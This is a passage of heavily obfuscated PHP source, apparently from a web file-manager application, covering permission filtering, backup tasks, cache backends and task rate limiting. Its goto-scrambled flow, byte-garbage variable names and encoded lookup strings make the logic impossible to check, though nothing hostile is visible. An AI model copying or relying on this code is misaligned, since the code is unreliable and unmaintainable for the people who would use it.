$_SERVER[¹…ÕÄ]; $a²„µšò‡É = parent::listData($F–‡Öñî); $b¥ÃÊò¶àí = $this->findByName($eµõåÅ‰ŠÈ[$cİ¾åäöˆ´[28]]); if (!$a²„µšò‡É || $b¥ÃÊò¶àí && $b¥ÃÊò¶àí[$cİ¾åäöˆ´[388]] != $a²„µšò‡É[$cİ¾åäöˆ´[388]]) { return !1; } $this->filterAuth($eµõåÅ‰ŠÈ[$cİ¾åäöˆ´[400]]); return parent::update($F–‡Öñî, $eµõåÅ‰ŠÈ); } public function remove($aÑÄÚ•ó‰Æ) { $bÈªÅƒ°¯Ì = parent::listData($aÑÄÚ•ó‰Æ); if (!$bÈªÅƒ°¯Ì || $bÈªÅƒ°¯Ì[$_SERVER[¹…ÕÄ][1148]]) { return !1; } return parent::remove($aÑÄÚ•ó‰Æ); } public function add($aù¶À±òö‡ = array()) { goto fÑ¬šëÌÌ‚; dç Î­„“î: $aù¶À±òö‡ = array_merge($F´ãïâ‚Á†, $aù¶À±òö‡); $aù¶À±òö‡[$BĞ™é©¹¡Æ[1690]] = $this->getSort(); $this->filterAuth($aù¶À±òö‡[$BĞ™é©¹¡Æ[400]]); goto CÙ Èš¥´…; CÙ Èš¥´…: return parent::insert($aù¶À±òö‡); goto b¸¸ù‘øÓ´; fÑ¬šëÌÌ‚: $BĞ™é©¹¡Æ =& $_SERVER[¹…ÕÄ]; if ($this->findByName($aù¶À±òö‡[$BĞ™é©¹¡Æ[28]])) { return !1; } $F´ãïâ‚Á† = array($BĞ™é©¹¡Æ[28] => $BĞ™é©¹¡Æ[33], $BĞ™é©¹¡Æ[400] => 1, $BĞ™é©¹¡Æ[1688] => $BĞ™é©¹¡Æ[1677], $BĞ™é©¹¡Æ[1689] => 1, $BĞ™é©¹¡Æ[1148] => 0, $BĞ™é©¹¡Æ[1690] => 0); goto dç Î­„“î; b¸¸ù‘øÓ´: } private function getSort() { $b•š™‚ª¤¡ =& $_SERVER[¹…ÕÄ]; $cù½§ËÕå« = parent::listData(); $f‡Èæòˆ„ = array_to_keyvalue($cù½§ËÕå«, $b•š™‚ª¤¡[33], $b•š™‚ª¤¡[1690]); return empty($f‡Èæòˆ„) ? 0 : max($f‡Èæòˆ„) + 1; } private function filterAuth(&$F‘ë‡šÕø) { goto F™Éé‘ËË±; BäÏá”âÓ: foreach ($BæÑŞ¡Ô¯ as $dš„×¨×©) { if ($F‘ë‡šÕø & $dš„×¨×©) { $EƒïÚÒ— ½[] = $dš„×¨×©; } } if (in_array(self::AUTH_ROOT, $EƒïÚÒ— ½)) { $F‘ë‡šÕø = array_sum($BæÑŞ¡Ô¯); return; } $cÌÎˆİŸÌ’ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto CÇ‹Ô‰µ ; F™Éé‘ËË±: if (!$F‘ë‡šÕø) { return; } $BæÑŞ¡Ô¯ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $EƒïÚÒ— ½ = array(); goto BäÏá”âÓ; CÇ‹Ô‰µ : foreach ($EƒïÚÒ— ½ as $dš„×¨×©) { if (isset($cÌÎˆİŸÌ’[$dš„×¨×©])) { $EƒïÚÒ— ½ = array_merge($EƒïÚÒ— ½, $cÌÎˆİŸÌ’[$dš„×¨×©]); } } $EƒïÚÒ— ½[] = self::AUTH_SHOW; $F‘ë‡šÕø = array_sum(array_unique($EƒïÚÒ— ½)); goto c¯•»í¡óØ; c¯•»í¡óØ: } public function sort($f«®Ìø•µà, $cŒ½Ú¶ÕÜÉ) { return parent::update($f«®Ìø•µà, $cŒ½Ú¶ÕÜÉ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x62\141\x63\153\165\160\x4c\151\163\164"; public $field = array("\x69\157", "\156\141\x6d\x65", "\163\164\141\164\x75\x73", "\x63\x6f\x6e\164\x65\x6e\x74", "\162\x65\163\x75\154\164", "\164\151\155\x65\x46\162\x6f\155", "\164\x69\155\x65\x54\x6f"); public function config() { goto CàÓ¾±¡‰; AÀ¯ËÙëÜ„: $dƒ‘‡©­Ÿ§ = is_array($dƒ‘‡©­Ÿ§) ? $dƒ‘‡©­Ÿ§ : array(); if (!isset($dƒ‘‡©­Ÿ§[$CİÑè¥à¨ù[708]])) { $dƒ‘‡©­Ÿ§[$CİÑè¥à¨ù[708]] = $CİÑè¥à¨ù[86]; } $d¡ßóÚëÓº = array(); goto f¶´÷Şé¦à; CàÓ¾±¡‰: $CİÑè¥à¨ù =& $_SERVER[¹…ÕÄ]; $dƒ‘‡©­Ÿ§ = Model($CİÑè¥à¨ù[1102])->get($CİÑè¥à¨ù[729]); $dƒ‘‡©­Ÿ§ = json_decode($dƒ‘‡©­Ÿ§, !0); goto AÀ¯ËÙëÜ„; bÎå”è¢Œ: if (isset($d¡ßóÚëÓº[$CİÑè¥à¨ù[195]])) { $d¡ßóÚëÓº[$CİÑè¥à¨ù[195]] = json_decode($d¡ßóÚëÓº[$CİÑè¥à¨ù[195]], !0); } if (isset($dƒ‘‡©­Ÿ§[$CİÑè¥à¨ù[195]])) { $d¡ßóÚëÓº[$CİÑè¥à¨ù[195]][$CİÑè¥à¨ù[1478]] = $dƒ‘‡©­Ÿ§[$CİÑè¥à¨ù[195]]; unset($dƒ‘‡©­Ÿ§[$CİÑè¥à¨ù[195]]); } return array_merge($d¡ßóÚëÓº, $dƒ‘‡©­Ÿ§); goto b¥´×àÒèØ; f¶´÷Şé¦à: Action($CİÑè¥à¨ù[1691])->taskInit(); $eöâ¾ÂÇ»Û = Model($CİÑè¥à¨ù[1692])->listData(); foreach ($eöâ¾ÂÇ»Û as $dêïÑÉ®†§) { if ($dêïÑÉ®†§[$CİÑè¥à¨ù[1148]] == $CİÑè¥à¨ù[86] && $dêïÑÉ®†§[$CİÑè¥à¨ù[1493]] == $CİÑè¥à¨ù[1693]) { $d¡ßóÚëÓº = $dêïÑÉ®†§; break; } } goto bÎå”è¢Œ; b¥´×àÒèØ: } public function listData($câÇ­Ş„¶ = false, $BÜ°ùƒë’ = "\x6d\x6f\x64\x69\146\x79\124\x69\155\x65", $cí™®Ş¢Øæ = false) { return parent::listData($câÇ­Ş„¶, $BÜ°ùƒë’, !0); } public function lastItem() { $C«±‚çË¤° = $this->listData(); return !empty($C«±‚çË¤°[0]) ? $C«±‚çË¤°[0] : null; } public function kill($Eˆ­±ö›ì) { goto dÄºØ¡…ğË; EŞÄºÀñõ°: $Cƒ²æÛª¶ä = $DİÃØ‘Ä¸[$f„Êî§İ¸[28]]; $eÙšÂÁÔ… = TEMP_FILES . $f„Êî§İ¸[725] . $Cƒ²æÛª¶ä . $f„Êî§İ¸[8]; IO::remove($eÙšÂÁÔ…, !1); goto b¬äñåà–Ì; dÄºØ¡…ğË: $f„Êî§İ¸ =& $_SERVER[¹…ÕÄ]; $DİÃØ‘Ä¸ = $this->listData($Eˆ­±ö›ì); if (!$DİÃØ‘Ä¸ || empty($DİÃØ‘Ä¸[$f„Êî§İ¸[28]])) { return !0; } goto cÛğìÊà­; b¬äñåà–Ì: return $this->remove($Eˆ­±ö›ì); goto BÂàê¥‚£; cÛğìÊà­: Task::kill($f„Êî§İ¸[728]); Task::kill($f„Êî§İ¸[747]); Task::kill($f„Êî§İ¸[756]); goto EŞÄºÀñõ°; BÂàê¥‚£: } public function remove($a»êÔ–¯‚™) { $cóÜÀÌ–‡Í = $this->listData($a»êÔ–¯‚™); if (!$cóÜÀÌ–‡Í) { return !0; } return $this->backupRemove($cóÜÀÌ–‡Í); } private function backupRemove($E¸…‹çèï) { $e—¡šéìºµ =& $_SERVER[¹…ÕÄ]; parent::remove($E¸…‹çèï[$e—¡šéìºµ[388]]); $f¢¶…ÁÌÇ¿ = "\x7b\151\157\72{$E¸…‹çèï[$e—¡šéìºµ[707]]}\x7d\57\144\141\164\x61\x62\x61\x73\145\x2f\142\x61\x63\x6b\165\160\137" . $E¸…‹çèï[$e—¡šéìºµ[28]]; IO::remove($f¢¶…ÁÌÇ¿, !1); return !0; } public function start() { goto AøÆÙ‚¹‘; DˆÕÕŒ¨Ò: $f½›ã‘×åã = new Backup(); $f½›ã‘×åã->keep(); $AàÁÀ—³¨ˆ = $f½›ã‘×åã->db(); goto Cì‰İ·Î; c²‹ĞšçÛ: if (!$A´ÍÙ¢«¯ò || $A´ÍÙ¢«¯ò[$a‰­ŞÒ›Ãó[1475]] != $a‰­ŞÒ›Ãó[86]) { return !1; } $CìÕ¤Ë©å = $this->process(); foreach ($CìÕ¤Ë©å as $E’óî¢Êœ) { if ($E’óî¢Êœ) { return Task::restart($E’óî¢Êœ[$a‰­ŞÒ›Ãó[388]]); } } goto DˆÕÕŒ¨Ò; AøÆÙ‚¹‘: $a‰­ŞÒ›Ãó =& $_SERVER[¹…ÕÄ]; if ($GLOBALS[$a‰­ŞÒ›Ãó[6]][$a‰­ŞÒ›Ãó[87]][$a‰­ŞÒ›Ãó[1694]] != $a‰­ŞÒ›Ãó[86]) { return !0; } $A´ÍÙ¢«¯ò = $this->config(); goto c²‹ĞšçÛ; Cì‰İ·Î: if ($AàÁÀ—³¨ˆ) { $AàÁÀ—³¨ˆ = $f½›ã‘×åã->dbFile(); if ($AàÁÀ—³¨ˆ && $A´ÍÙ¢«¯ò[$a‰­ŞÒ›Ãó[708]] == $a‰­ŞÒ›Ãó[491]) { $AàÁÀ—³¨ˆ = $f½›ã‘×åã->file(); } } Backup::set(array($a‰­ŞÒ›Ãó[705] => 1, $a‰­ŞÒ›Ãó[470] => time())); return !0; goto E´ÆÙ£À›“; E´ÆÙ£À›“: } public function process() { $C›†ĞŞ—ã =& $_SERVER[¹…ÕÄ]; return array($C›†ĞŞ—ã[710] => Task::get($C›†ĞŞ—ã[728]), $C›†ĞŞ—ã[713] => Task::get($C›†ĞŞ—ã[747]), $C›†ĞŞ—ã[173] => Task::get($C›†ĞŞ—ã[756])); } public function restore() { $E¯–É‚àó =& $_SERVER[¹…ÕÄ]; ActionCall($E¯–É‚àó[997], !0, 1); ActionCall($E¯–É‚àó[997], !0, 0); } } goto aìŞà£…æ; e˜¢Âè»Ğè: class BackupFile { public function __construct() { } public function index() { goto cœÇíÉ•Ç; cœÇíÉ•Ç: $E¤¼³Òù = Backup::get(); $dÇ›ó¢ğö± = $E¤¼³Òù[$_SERVER[¹…ÕÄ][289]][$_SERVER[¹…ÕÄ][173]][$_SERVER[¹…ÕÄ][441]]; $e™×ğÊ§“¸ = array($_SERVER[¹…ÕÄ][442] => array($_SERVER[¹…ÕÄ][754], $dÇ›ó¢ğö±), $_SERVER[¹…ÕÄ][755] => array($_SERVER[¹…ÕÄ][327], $E¤¼³Òù[$_SERVER[¹…ÕÄ][707]])); goto D„ãÓ‘ æ»; dïéâº›à: $this->_fileFilter($b•„×»Ú…); return !0; goto FÄª­©Æ­œ; Eí¼Î¡Ø¹ç: $b©§íê¶¸->task[$_SERVER[¹…ÕÄ][714]] = $B¡©Ê“šÖ–; $cù òàÁ‰• = array($_SERVER[¹…ÕÄ][758] => $D¨“ˆ›¼±, $_SERVER[¹…ÕÄ][759] => $B¡©Ê“šÖ–); Backup::set($cù òàÁ‰•); goto c†ä×¸ÕŠ; D„ãÓ‘ æ»: $D¨“ˆ›¼± = (int) Model($_SERVER[¹…ÕÄ][734])->where($e™×ğÊ§“¸)->count($_SERVER[¹…ÕÄ][441]); $B¡©Ê“šÖ– = (int) Model($_SERVER[¹…ÕÄ][734])->where($e™×ğÊ§“¸)->sum($_SERVER[¹…ÕÄ][77]); $b©§íê¶¸ = new TaskFileTransfer($_SERVER[¹…ÕÄ][756], $_SERVER[¹…ÕÄ][729], $D¨“ˆ›¼±, LNG($_SERVER[¹…ÕÄ][730]) . $_SERVER[¹…ÕÄ][731] . LNG($_SERVER[¹…ÕÄ][757])); goto Eí¼Î¡Ø¹ç; Aß¯÷Ç¥Ÿ¼: $Fº¸‘–íí‚ = $Dºí…¤Û½ = 0; do { $cŸÁÃ×æš‰ = $_SERVER[¹…ÕÄ][760]; $E¥àË™Ù• = Model($_SERVER[¹…ÕÄ][734])->where($e™×ğÊ§“¸)->field($cŸÁÃ×æš‰)->order($_SERVER[¹…ÕÄ][761])->selectPage($EôÒİÜÚ¦ê, $D³ÇÇó°Ù‰); $bÕ¸¼ö„Í = !empty($E¥àË™Ù•[$_SERVER[¹…ÕÄ][365]]) ? $E¥àË™Ù•[$_SERVER[¹…ÕÄ][365]] : array(); foreach ($bÕ¸¼ö„Í as $f¡Ï‹á¥í) { goto eå°¶œÇõÊ; EœÚ‡¡”œ³: if (IO::exist($CïÌè ª»)) { $b©§íê¶¸->updateFileEnd($f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][28]], $f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][77]]); } else { $CïÌè ª» = get_path_father($CïÌè ª»); IO::mkdir($CïÌè ª»); if (!IO::copy($EÛä˜ƒµ¨ø, $CïÌè ª», $_SERVER[¹…ÕÄ][764])) { write_log($_SERVER[¹…ÕÄ][765] . $EÛä˜ƒµ¨ø . $_SERVER[¹…ÕÄ][750] . $CïÌè ª» . $_SERVER[¹…ÕÄ][499], $_SERVER[¹…ÕÄ][729]); $Eøöñ÷İİø = !1; break; } } $dÇ›ó¢ğö± = $f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][441]]; $DÃ†ë¸×ÖÃ += 1; goto AÊ²Š…«; AÊ²Š…«: $C¼Ğ‹ğœ‚ += $f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][77]]; $Dºí…¤Û½ += 1; $Fº¸‘–íí‚ += $f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][77]]; goto bÕ£‹ß¿«; eå°¶œÇõÊ: if (!$this->_fileExist($f¡Ï‹á¥í, $b•„×»Ú…, $Fôä”ÕÂò)) { $D¨“ˆ›¼± -= 1; $B¡©Ê“šÖ– -= (int) $f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][77]]; write_log("\146\151\154\x65\x20\156\x6f\164\x20\145\170\151\163\164\x2e\146\151\x6c\x65\x49\x44\x3a{$f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][441]]}\x2c\x20\x70\x61\164\x68\x3a{$f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][75]]}", $_SERVER[¹…ÕÄ][762]); continue; } $EÛä˜ƒµ¨ø = $f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][75]]; $CïÌè ª» = "\173\151\157\x3a{$E¤¼³Òù[$_SERVER[¹…ÕÄ][707]]}\175" . substr($EÛä˜ƒµ¨ø, strlen("\x7b\x69\157\72{$f¡Ï‹á¥í[$_SERVER[¹…ÕÄ][763]]}\175")); goto EœÚ‡¡”œ³; bÕ£‹ß¿«: if ($C¼Ğ‹ğœ‚ >= 1024 * 1024 * 100) { $cù òàÁ‰• = array($_SERVER[¹…ÕÄ][766] => $dÇ›ó¢ğö±, $_SERVER[¹…ÕÄ][767] => $Dºí…¤Û½, $_SERVER[¹…ÕÄ][768] => $Fº¸‘–íí‚); Backup::set($cù òàÁ‰•); $C¼Ğ‹ğœ‚ = $DÃ†ë¸×ÖÃ = 0; } goto eçøÄÛ—­™; eçøÄÛ—­™: } $f‚Å ëµÕ¸ = count($bÕ¸¼ö„Í); $D³ÇÇó°Ù‰++; } while ($f‚Å ëµÕ¸ == $EôÒİÜÚ¦ê); $b©§íê¶¸->end(); goto B®ê“ÎÉËæ; c†ä×¸ÕŠ: $Eøöñ÷İİø = !0; $Fôä”ÕÂò = $this->storeIds(); $D³ÇÇó°Ù‰ = 1; goto Dëâ·ô­¨¯; Dëâ·ô­¨¯: $EôÒİÜÚ¦ê = 1000; $C¼Ğ‹ğœ‚ = $DÃ†ë¸×ÖÃ = 0; $b•„×»Ú… = array(); goto Aß¯÷Ç¥Ÿ¼; B®ê“ÎÉËæ: $cù òàÁ‰• = array($_SERVER[¹…ÕÄ][769] => 1, $_SERVER[¹…ÕÄ][470] => time(), $_SERVER[¹…ÕÄ][724] => 1, $_SERVER[¹…ÕÄ][766] => $dÇ›ó¢ğö±, $_SERVER[¹…ÕÄ][759] => $B¡©Ê“šÖ–, $_SERVER[¹…ÕÄ][758] => $D¨“ˆ›¼±); if ($DÃ†ë¸×ÖÃ) { $cù òàÁ‰•[$_SERVER[¹…ÕÄ][767]] = $Dºí…¤Û½; $cù òàÁ‰•[$_SERVER[¹…ÕÄ][768]] = $Fº¸‘–íí‚; } Backup::set($cù òàÁ‰•); goto dïéâº›à; FÄª­©Æ­œ: } private function _fileExist($BÄŸÇ™ë®Ó, &$F¬×™áğ, $d–óÅò§ŠŠ) { goto dÅ›ÑÏì©Å; Cèòã¨É»: if (IO::exist($B¼ŠŞöÌáÕ)) { $F¬×™áğ[] = $BÄŸÇ™ë®Ó[$B†Œ¨¶Úº‡[441]]; return !1; } $Fí¦Ÿíâ“Ì = array($B†Œ¨¶Úº‡[763] => $BÄŸÇ™ë®Ó[$B†Œ¨¶Úº‡[763]], $B†Œ¨¶Úº‡[75] => array($B†Œ¨¶Úº‡[378], "{$B¼ŠŞöÌáÕ}\45")); $C…¡¶‘á†ñ = Model($B†Œ¨¶Úº‡[734])->where($Fí¦Ÿíâ“Ì)->field($B†Œ¨¶Úº‡[442])->select(); goto bê‰Îˆ¹Ÿ; dÅ›ÑÏì©Å: $B†Œ¨¶Úº‡ =& $_SERVER[¹…ÕÄ]; $eë„åàŒó = $BÄŸÇ™ë®Ó[$B†Œ¨¶Úº‡[75]]; if (in_array($BÄŸÇ™ë®Ó[$B†Œ¨¶Úº‡[441]], $F¬×™áğ)) { return !1; } goto B «ùÒñè¸; bê‰Îˆ¹Ÿ: $F¬×™áğ = array_merge($F¬×™áğ, array_to_keyvalue($C…¡¶‘á†ñ, $B†Œ¨¶Úº‡[33], $B†Œ¨¶Úº‡[441])); return !1; goto cÍß­›§; B «ùÒñè¸: if (!in_array($BÄŸÇ™ë®Ó[$B†Œ¨¶Úº‡[763]], $d–óÅò§ŠŠ)) { return !1; } if (IO::exist($eë„åàŒó)) { return !0; } $B¼ŠŞöÌáÕ = get_path_father($eë„åàŒó); goto Cèòã¨É»; cÍß­›§: } private function _fileFilter($E–¢…“”„§) { $A Æ…íæù =& $_SERVER[¹…ÕÄ]; if (empty($E–¢…“”„§)) { return; } $B¿®À­£´ = array($A Æ…íæù[441] => array($A Æ…íæù[7], array_unique($E–¢…“”„§))); $FµÃº®ãÇ  = Model($A Æ…íæù[770])->where($B¿®À­£´)->field($A Æ…íæù[390])->select(); foreach ($FµÃº®ãÇ  as $aÇå“¶ê¦ã) { Model($A Æ…íæù[770])->remove($aÇå“¶ê¦ã[$A Æ…íæù[390]], !1); } } private function storeIds() { $E¦åà¿§Î =& $_SERVER[¹…ÕÄ]; $CñŒ×Ô†ºò = Model($E¦åà¿§Î[719])->listData(); $Bô©Øƒ¹é¶ = array(); $EŒ£Áº˜Â = $GLOBALS[$E¦åà¿§Î[6]][$E¦åà¿§Î[87]][$E¦åà¿§Î[771]]; foreach ($CñŒ×Ô†ºò as $FÁ…¡¢«) { $f´ğŸ†×²Ç = strtolower($FÁ…¡¢«[$E¦åà¿§Î[93]]); if (!isset($EŒ£Áº˜Â[$f´ğŸ†×²Ç])) { continue; } $E¼Ÿë˜§Ì› = $E¦åà¿§Î[71] . (isset($EŒ£Áº˜Â[$f´ğŸ†×²Ç]) ? $EŒ£Áº˜Â[$f´ğŸ†×²Ç] : ucfirst($f´ğŸ†×²Ç)); if (!class_exists($E¼Ÿë˜§Ì›)) { continue; } $Bô©Øƒ¹é¶[] = $FÁ…¡¢«[$E¦åà¿§Î[388]]; } return $Bô©Øƒ¹é¶; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto e™­ô²¸Êƒ; AäŠ¢Œ§´: $BÂŒ»ê¬ö = $GLOBALS[$a‚‚‰êÌâ£[6]][$a‚‚‰êÌâ£[345]]; $dÑ¿’øÅªã = $BÂŒ»ê¬ö[$BÂŒ»ê¬ö[$a‚‚‰êÌâ£[772]]]; $dİƒ¦Æ²²Í = $BÂŒ»ê¬ö[$a‚‚‰êÌâ£[773]]; goto B’‰î£ÕÕ; e™­ô²¸Êƒ: $a‚‚‰êÌâ£ =& $_SERVER[¹…ÕÄ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto AäŠ¢Œ§´; B’‰î£ÕÕ: switch ($BÂŒ»ê¬ö[$a‚‚‰êÌâ£[772]]) { case $a‚‚‰êÌâ£[17]: self::$handle = Model($a‚‚‰êÌâ£[774]); break; case $a‚‚‰êÌâ£[775]: self::$handle = new CacheRedis($dÑ¿’øÅªã, $dİƒ¦Æ²²Í); break; case $a‚‚‰êÌâ£[776]: self::$handle = new CacheMemcached($dÑ¿’øÅªã, $dİƒ¦Æ²²Í); break; case $a‚‚‰êÌâ£[173]: self::$handle = new CacheFile($dÑ¿’øÅªã, $dİƒ¦Æ²²Í); break; default: break; } return self::$handle; goto Då§…œ…ˆ; Då§…œ…ˆ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($eîÂäÛã®˜) { if (is_array($eîÂäÛã®˜) || is_object($eîÂäÛã®˜)) { $eîÂäÛã®˜ = json_encode($eîÂäÛã®˜); } $eîÂäÛã®˜ = rawurlencode($eîÂäÛã®˜); return md5(KOD_SITE_ID . $_SERVER[¹…ÕÄ][70] . $eîÂäÛã®˜); } public static function get($bˆÜà†Ó‘­, $FÑê†ÓÇ¢Ê = false) { $AÑÏö Öµ® = self::key($bˆÜà†Ó‘­); if ($FÑê†ÓÇ¢Ê) { return unserialize(self::init()->get($AÑÏö Öµ®)); } if (!isset(self::$memoryCache[$AÑÏö Öµ®])) { $D­Üñ‡‰öÃ = self::init()->get($AÑÏö Öµ®); self::$memoryCache[$AÑÏö Öµ®] = unserialize($D­Üñ‡‰öÃ); } return self::$memoryCache[$AÑÏö Öµ®]; } public static function set($b °ÙêİÙõ, $FÊƒÚ­ŒÅ¾, $fÚº”¸Ì¯Ü = false) { goto b¾ğëù¡ŞÇ; Eù‰«‚æ¤é: CacheLock::lock($b °ÙêİÙõ); $eì“¬Ìğ = self::init()->set($Fµ×é·¼Ø, serialize($FÊƒÚ­ŒÅ¾), $fÚº”¸Ì¯Ü); self::$memoryCache[$Fµ×é·¼Ø] = $FÊƒÚ­ŒÅ¾; goto a«ßïˆƒÊ¬; a«ßïˆƒÊ¬: CacheLock::unlock($b °ÙêİÙõ); return $eì“¬Ìğ; goto eõ‘÷¼Û´Ä; b¾ğëù¡ŞÇ: $Fµ×é·¼Ø = self::key($b °ÙêİÙõ); if (isset(self::$memoryCache[$Fµ×é·¼Ø]) && self::$memoryCache[$Fµ×é·¼Ø] === $FÊƒÚ­ŒÅ¾) { return !0; } if ($fÚº”¸Ì¯Ü === 0) { self::$memoryCache[$Fµ×é·¼Ø] = $FÊƒÚ­ŒÅ¾; return !0; } goto Eù‰«‚æ¤é; eõ‘÷¼Û´Ä: } public static function remove($eº¯ßéŒÇ) { goto E„„ÌÃÆ¦”; d¨ø½ù¤‚Ö: CacheLock::lock($eº¯ßéŒÇ); $bî¯Âº†Ş = self::init()->remove($A²ˆ­¥äœä); CacheLock::unlock($eº¯ßéŒÇ); goto BğŞº‰å­†; BğŞº‰å­†: return $bî¯Âº†Ş; goto cŒô·‘¸“Ü; E„„ÌÃÆ¦”: $A²ˆ­¥äœä = self::key($eº¯ßéŒÇ); unset(self::$memoryCache[$A²ˆ­¥äœä]); self::clearTimeout(); goto d¨ø½ù¤‚Ö; cŒô·‘¸“Ü: } public static function removeMemory($e‚­ñ«›¦) { $Eáª«‡Œ“’ = self::key($e‚­ñ«›¦); unset(self::$memoryCache[$Eáª«‡Œ“’]); } public static function clearMemory($eîÆÙÙ¡†¨ = false) { if ($eîÆÙÙ¡†¨) { $eîÆÙÙ¡†¨ = self::key($eîÆÙÙ¡†¨); unset(self::$memoryCache[$eîÆÙÙ¡†¨]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹…ÕÄ][777])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹…ÕÄ][778])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($E¬•åùæÈ¦, $bØÃˆ¶‚¹) { $d†ÎñÃ¡ =& $_SERVER[¹…ÕÄ]; $this->cachePath = $E¬•åùæÈ¦[$d†ÎñÃ¡[75]]; $this->prefix = $d†ÎñÃ¡[779]; $this->cacheTime = $bØÃˆ¶‚¹; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($fœ«©çë’ß) { $fˆ ôÚÛø =& $_SERVER[¹…ÕÄ]; $fœ«©çë’ß = str_replace(array($fˆ ôÚÛø[780], $fˆ ôÚÛø[96], $fˆ ôÚÛø[69]), $fˆ ôÚÛø[781], $fœ«©çë’ß); return $this->cachePath . $fˆ ôÚÛø[782] . $fœ«©çë’ß . $fˆ ôÚÛø[783]; } public function set($dä–˜Ú·», $aøÏÊ‚éÍ, $dù‹»„”åÆ = false) { $CÜœÇ¡œÓ¦ = $this->getFile($dä–˜Ú·»); if (file_put_contents($CÜœÇ¡œÓ¦, $this->prefix . $aøÏÊ‚éÍ, LOCK_EX)) { return !0; } @unlink($CÜœÇ¡œÓ¦); return !1; } public function get($BÙÛËéÎÚò) { $fÅ¦…áÜîì = $this->getFile($BÙÛËéÎÚò); if (file_exists($fÅ¦…áÜîì) && filemtime($fÅ¦…áÜîì) < time() - $this->cacheTime) { @unlink($fÅ¦…áÜîì); return !1; } $e†œŠºÑùÑ = @file_get_contents($fÅ¦…áÜîì); return substr($e†œŠºÑùÑ, strlen($this->prefix)); } public function remove($fÅ÷è¨–½Ö) { $b±Œ¾Äò¨Í = $this->getFile($fÅ÷è¨–½Ö); return @unlink($b±Œ¾Äò¨Í); } public function deleteAll() { $CŠ£µÕ»”Á =& $_SERVER[¹…ÕÄ]; $EŞæ²Ó½Ù = scandir($this->cachePath); foreach ($EŞæ²Ó½Ù as $d®¥•¯Œ×ñ) { $eéÎœ  = $this->cachePath . $d®¥•¯Œ×ñ; if (strpos($eéÎœ , $CŠ£µÕ»”Á[783]) && strpos($eéÎœ , $CŠ£µÕ»”Á[784])) { @unlink($eéÎœ ); } } } public function clearTimeout() { $FÕË‰ëÈì =& $_SERVER[¹…ÕÄ]; $AİÑ“´…ì = scandir($this->cachePath); foreach ($AİÑ“´…ì as $bôÜ»¬ÏŠƒ) { $e‹‰ãßœ‚¯ = $this->cachePath . $bôÜ»¬ÏŠƒ; if (strpos($e‹‰ãßœ‚¯, $FÕË‰ëÈì[783]) && strpos($e‹‰ãßœ‚¯, $FÕË‰ëÈì[784]) && filemtime($e‹‰ãßœ‚¯) < time() - $this->cacheTime) { @unlink($e‹‰ãßœ‚¯); } } } } goto cäÈçôŠ‘Ò; dø˜²„Üªñ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($F¼ååôÖî÷, $dÙÛ—Ôİ›ä = 5.0) { if (!$F¼ååôÖî÷) { return; } $cĞ¼ĞÃÜ¸ = Cache::get($F¼ååôÖî÷); if (!$cĞ¼ĞÃÜ¸ || timeFloat() - floatVal($cĞ¼ĞÃÜ¸) >= $dÙÛ—Ôİ›ä) { Cache::set($F¼ååôÖî÷, timeFloat(), $dÙÛ—Ôİ›ä * 10); return !0; } return !1; } public static function timeLimitCall($B“ºÈ¾Ë, $Dä›’ÄÓ†, $DïµŸîŠŸİ, $Fß‡èé§ = 5.0) { goto fãâ®âÉ’; fãâ®âÉ’: $d’»˜ğ‹Œ¶ =& $_SERVER[¹…ÕÄ]; if (!$B“ºÈ¾Ë || !$Dä›’ÄÓ†) { return; } self::$asyncAdd = !0; goto AÎ³’¨ãø„; B’›‘Ş»È: Cache::set($cè†¬ ÖÈˆ, $DŸ§µÙ¢ø„, 60); Cache::removeMemory($cè†¬ ÖÈˆ); write_log($d’»˜ğ‹Œ¶[1581] . $B“ºÈ¾Ë . $d’»˜ğ‹Œ¶[67] . $Dä›’ÄÓ†, $d’»˜ğ‹Œ¶[1575]); goto B¡¦İ ™¿Ş; BÂ–³½Õ¥™: if (is_array($DŸ§µÙ¢ø„[$B“ºÈ¾Ë])) { $AŠŸ‡–Ì›ˆ[$d’»˜ğ‹Œ¶[1580]] = $DŸ§µÙ¢ø„[$B“ºÈ¾Ë][$d’»˜ğ‹Œ¶[1580]]; } if (is_array($DŸ§µÙ¢ø„[$B“ºÈ¾Ë])) { if (timeFloat() - $DŸ§µÙ¢ø„[$B“ºÈ¾Ë][$d’»˜ğ‹Œ¶[1579]] < $AŠŸ‡–Ì›ˆ[$d’»˜ğ‹Œ¶[195]] * 0.3) { return; } $AŠŸ‡–Ì›ˆ[$d’»˜ğ‹Œ¶[1580]] = $DŸ§µÙ¢ø„[$B“ºÈ¾Ë][$d’»˜ğ‹Œ¶[1580]]; } $DŸ§µÙ¢ø„[$B“ºÈ¾Ë] = $AŠŸ‡–Ì›ˆ; goto B’›‘Ş»È; AÎ³’¨ãø„: $cè†¬ ÖÈˆ = $d’»˜ğ‹Œ¶[1578]; $DŸ§µÙ¢ø„ = Cache::get($cè†¬ ÖÈˆ, !0); 